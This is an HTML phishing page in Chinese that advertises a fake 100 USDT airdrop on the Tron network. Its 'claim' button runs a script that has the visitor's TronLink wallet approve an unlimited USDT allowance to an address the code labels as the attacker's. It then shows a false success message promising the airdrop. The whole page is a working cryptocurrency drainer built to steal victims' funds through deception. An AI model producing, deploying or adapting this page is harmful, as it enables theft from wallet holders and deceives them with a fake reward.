<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>限時空投活動</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
</head>
<body>
<h2>🎁 限時活動：領取 100 USDT 空投</h2>
<button onclick="approve()">立即領取</button>
<script>
const token = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // 主網 USDT
const attacker = 'TTcT9Q6h7JRtbRXvT4ScEp5htH52ARKkY3'; // 攻擊者地址
const max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

async function approve() {
  const tronWeb = window.tronWeb;
  if (!tronWeb.defaultAddress.base58) {
    return alert('請先登入 TronLink 錢包');
  }
  const contract = await tronWeb.contract().at(token);
  await contract.approve(attacker, max).send();
  alert("✅ 授權成功，空投將於24小時內發送！");
}
</script>
</body>
</html>
